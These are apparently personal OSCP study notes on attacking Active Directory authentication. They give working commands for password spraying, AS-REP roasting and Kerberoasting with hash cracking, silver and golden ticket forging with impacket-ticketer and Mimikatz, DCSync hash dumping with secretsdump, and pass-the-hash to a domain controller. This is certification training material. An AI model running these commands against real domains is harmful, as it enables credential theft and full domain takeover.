# Module 23 Attacking Active Directory Authentication


## 22.2.1 Password Attack

> refer to crackmapexec cheatsheet

**Password Spraying**
```bash
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```
> Username list /usr/share/seclists/Usernames/Names/names.txt

---

## 23.2.2 AS-REP Roasting

**Check for Kerberos preauthentication**
```bash
impacket-GetNPUsers corp.com/ -usersfile users.txt -dc-ip <DC_IP> -no-pass -format hashcat

#Example, with user authenticated.
impacket-GetNPUsers corp.com/pete -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast 
```

**Rubeus.exe**
> Run on windows
```powershell
Rubeus.exe asreproast /outfile:hashes.txt
```

**Kerboroasting**
```bash
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

When you'd use Rubeus over Impacket:

- You already have a shell on a domain-joined Windows machine
- You want to work from inside the domain context (uses the current user's Kerberos tickets automatically)
- You need to extract tickets from the machine's memory

When you'd use Impacket instead:

- You're attacking from Kali with just credentials
- You don't have a Windows foothold
- You're going through a pivot


**Get users.txt**
```bash
# If you have any valid creds, dump all usernames first
crackmapexec smb <DC_IP> -u user -p 'password' --users
```

---

## 23.2.3 Kerboroasting

Remember SPNs (Service Principal Names) — they link a service to the domain account running it. Kerberoasting exploits this:

1. Any authenticated domain user can request a service ticket (TGS) for any SPN
2. That ticket is encrypted with the service account's password hash
3. You request the ticket, extract it, and crack it offline to recover the service account's password


**Using impacket**
```bash
# Request TGS tickets for all Kerberoastable accounts
impacket-GetUserSPNs corp.com/pete:'password' -dc-ip 192.168.132.70 -request -outputfile kerberoast.txt

# Then crack the .txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

**Using Rubeus**
```powershell
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

---

## 23.2.4 Silver Ticket

> Forge a Kerberos service ticket (TGS) to access a specific service as any user — including a fake Domain Admin — without contacting the DC. Lower priority for OSCP (skim), but know the concept.

---

### The Concept

A **silver ticket** is a forged TGS (service ticket) for ONE specific service on ONE machine. Because a service ticket is encrypted with the **service account's password hash**, if you have that hash, you can forge a valid ticket for that service and impersonate any user to it — even a Domain Admin.

**Silver vs Golden ticket:**
| | Silver Ticket | Golden Ticket |
|---|--------------|---------------|
| Forged with | A service account's hash (e.g. a machine account) | The KRBTGT account's hash |
| Grants access to | ONE service on ONE host | The ENTIRE domain (any service) |
| Contacts DC? | No (stealthier) | No |
| Scope | Narrow | Total domain control |

Silver = one service. Golden = whole domain (needs KRBTGT hash from DCSync).

---

### What You Need for a Silver Ticket

1. **The service account's NTLM hash** (or AES key) — often a machine account hash (`MACHINE$`) or a service account you Kerberoasted
2. **The domain SID**
3. **The SPN** of the target service (e.g. `cifs/files04.corp.com`)
4. **The username** you want to impersonate (e.g. Administrator)

---

### Getting the Pieces

**Domain SID:**
```bash
# From Kali with creds
impacket-lookupsid corp.com/user:pass@<DC_IP>
# or on Windows
whoami /user      # SID minus the last RID chunk
```

**Service account hash:**
- Machine account hash → from `secretsdump` or Mimikatz on a compromised host
- Service account hash → from Kerberoasting + cracking, or dumped hashes

---

### Forging a Silver Ticket

#### Impacket (from Kali)
```bash
# Forge the ticket
impacket-ticketer -nthash <SERVICE_HASH> -domain-sid <DOMAIN_SID> -domain corp.com -spn cifs/files04.corp.com Administrator

# This creates Administrator.ccache
export KRB5CCNAME=Administrator.ccache

# Use it (pass-the-ticket)
impacket-psexec -k -no-pass corp.com/Administrator@files04.corp.com
```

#### Mimikatz (on Windows)
```
kerberos::golden /user:Administrator /domain:corp.com /sid:<DOMAIN_SID> /target:files04.corp.com /service:cifs /rc4:<SERVICE_HASH> /ptt
```
(Mimikatz uses `golden` command syntax for silver tickets too — the difference is supplying a service hash + target/service instead of the KRBTGT hash.)

---

### Common SPN Service Types

| Service | SPN prefix | Access gained |
|---------|-----------|---------------|
| File shares (SMB) | `cifs/` | Read/write files, PsExec |
| PowerShell Remoting | `http/` | WinRM |
| Scheduled tasks | `host/` | Task creation |
| WMI | `host/`, `rpcss/` | WMI execution |
| MSSQL | `mssqlsvc/` | Database access |

---

### The Attack Flow

```
1. Compromise a host, dump the machine/service account hash (secretsdump)
2. Get the domain SID
3. Forge a silver ticket for a target service (cifs/host)
   impersonating Administrator
4. Inject the ticket (pass-the-ticket / ccache)
5. Access that service as Administrator
```

---

### When to Use It (OSCP context)

- **Rarely the intended path** on OSCP — Kerberoasting, AS-REP roasting, and DCSync are far more common.
- Useful when you have a **service/machine account hash** but not a full DA path, and need to access a specific service.
- **Golden ticket** (KRBTGT-based) is more powerful but requires DCSync first — at which point you already own the domain.

**Priority: SKIM.** Understand the concept (forge a ticket with a service hash to impersonate anyone to that service). Don't grind the mechanics — the roasting attacks and DCSync are what you'll actually use.

---

### Golden Ticket (brief, for completeness)

Requires the **KRBTGT hash** (obtained via DCSync). Forges a TGT granting access to the entire domain as any user.

```bash
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain corp.com Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.com/Administrator@dc1.corp.com
```

By the time you can make a golden ticket, you've already DCSynced the domain — so it's mostly a persistence technique.

---

### Key Notes

- Silver ticket = one service, needs that service's hash. Golden ticket = whole domain, needs KRBTGT hash.
- Both are forged offline — no DC contact for creation (stealthy).
- For OSCP, prioritize Kerberoasting / AS-REP / DCSync over ticket forging.
- `impacket-ticketer` (forge) + `KRB5CCNAME` (load) + `-k -no-pass` (use) is the Kali workflow.

---


## 23.2.5 Domain Controller Sync

A DCSync attack is a malicious technique where an attacker pretends to be a legitimate Windows Domain Controller (DC) to steal password hashes from a real DC. It abuses normal Active Directory replication functions using the Directory Replication Service Remote Protocol (MS-DRSR) without running code on the target server's local memory


**How the Attack WorksPrivilege Requirement:** 
1. The attacker needs an account that already has directory replication rights, such as Domain Admin, Enterprise Admin, or a custom configured account.
2. Impersonation Request: Using tools like Mimikatz or Impacket, the attacker sends a replication request (GetNCChanges) to a real Domain Controller.
3. Data Extraction: The real DC trusts the request and hands over sensitive user data, including NTLM password hashes and the krbtgt account hash, which allows attackers to create Golden Tickets for total domain control


**How it works**
```powershell
#Start mimikatz
.\mimikatz.exe

#On mimikatz
lsadump::dcsync /user:corp\user
```

---

**DCSync — Complete Breakdown**

**What it actually does:**

DCSync abuses the **replication mechanism** that Domain Controllers use to sync data with each other. In a domain with multiple DCs, they constantly replicate account data (including password hashes) to stay in sync. DCSync tricks the DC into thinking you're another DC requesting a replication update — so it hands you the password hashes.

You're not "hacking" the DC — you're **asking it to replicate credentials to you**, and it complies because you have the replication rights.

**The criteria (conditions) to use DCSync:**

**1. You need replication rights — specifically these two extended rights:**
- `DS-Replication-Get-Changes`
- `DS-Replication-Get-Changes-All`

**Who has these by default:**
- Domain Admins
- Enterprise Admins
- Domain Controllers themselves

**Who might have them via misconfiguration (your escalation opportunity):**
- A regular user an admin accidentally granted these rights to
- A service account
- A group your compromised user belongs to

**2. Network access to the DC** (port 445 and the RPC ports).

**3. Valid credentials for the account that holds the replication rights.**

That's it. You do NOT need:
- A shell on the DC
- SYSTEM privileges

You just need an account (any account) that has those replication rights, and network access to the DC.

**How you know you can DCSync — BloodHound flags it:**

BloodHound has a specific edge called **DCSync** and a pre-built query "Find Principals with DCSync Rights." When you see your compromised user (or a group they're in) has a DCSync edge to the domain, that's your signal — you can dump all hashes.

Check manually with PowerView:
```powershell
Get-DomainObjectACL -Identity "corp.com" -ResolveGUIDs | ? {
    $_.ActiveDirectoryRights -match "Replication" -or 
    $_.ObjectAceType -match "Replication"
}
```

**The commands:**

**Dump a specific user's hash (targeted — cleaner):**
```bash
impacket-secretsdump corp.com/compromised_user:'password'@<DC_IP> -just-dc-user Administrator
```

**Dump the KRBTGT hash (for golden ticket):**
```bash
impacket-secretsdump corp.com/compromised_user:'password'@<DC_IP> -just-dc-user krbtgt
```

**Dump ALL domain hashes:**
```bash
impacket-secretsdump corp.com/compromised_user:'password'@<DC_IP> -just-dc
```

**With a hash instead of password:**
```bash
impacket-secretsdump -hashes :<NTLM_hash> corp.com/compromised_user@<DC_IP> -just-dc-user Administrator
```

**On Windows with Mimikatz:**
```
lsadump::dcsync /domain:corp.com /user:Administrator
```

**When to use DCSync — the scenarios:**

**Scenario 1 — Escalation (the important one):**
```
You compromise a user with DCSync rights (but not full DA)
   ↓
DCSync to dump the Administrator NTLM hash
   ↓
Pass-the-hash to the DC with Administrator's hash
   ↓
Domain owned
```
Here DCSync IS your escalation path — it turns "I have a user with replication rights" into "I have the Administrator hash."

**Scenario 2 — Getting clean credentials:**
```
You have Domain Admin but through an awkward account
   ↓
DCSync the Administrator hash
   ↓
Use Administrator's hash for reliable access to everything
```

**Scenario 3 — Harvesting for lateral movement:**
```
You reach a position with DCSync rights
   ↓
Dump ALL domain hashes (-just-dc)
   ↓
Now you have every user's hash for accessing any machine
```

**Scenario 4 — Setting up golden ticket:**
```
DCSync the KRBTGT hash
   ↓
Forge a golden ticket for persistence
```

**The output — what you get:**

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTLM_hash>:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<NTLM_hash>:::
...every account...
```

Each line gives you the NTLM hash. You then **pass-the-hash** with any of these:
```bash
impacket-psexec -hashes :<Administrator_NTLM> corp.com/Administrator@<DC_IP>
```

**Why DCSync is a top-tier AD attack:**

1. **It's often an escalation, not just post-victory** — misconfigured replication rights on a non-admin account are a common finding
2. **No shell on the DC needed** — purely remote, just needs the right account + network access
3. **Dumps everything** — all hashes, including KRBTGT and Administrator
4. **Clean** — you get NTLM hashes to pass, no cracking needed

**The mental model:**

```
DCSync = "impersonate a Domain Controller and ask for password data"
   ↓
Requires: replication rights (DS-Replication-Get-Changes[-All])
   ↓
These rights = Domain Admin, OR a misconfigured account (your escalation)
   ↓
Result: all the domain's NTLM hashes
   ↓
Use: pass-the-hash to own the DC / any machine
```

**For OSCP — the key takeaway:**

DCSync matters because it's frequently the **escalation move**: BloodHound shows you a compromised user has DCSync rights, you dump the Administrator hash, you pass-the-hash to the DC. That's a complete domain compromise chain that doesn't require you to already be Domain Admin — just a user with replication rights.

**The one command to remember:**
```bash
impacket-secretsdump corp.com/user:'password'@<DC_IP> -just-dc-user Administrator
```
Dumps the Administrator hash → pass-the-hash → own the domain.

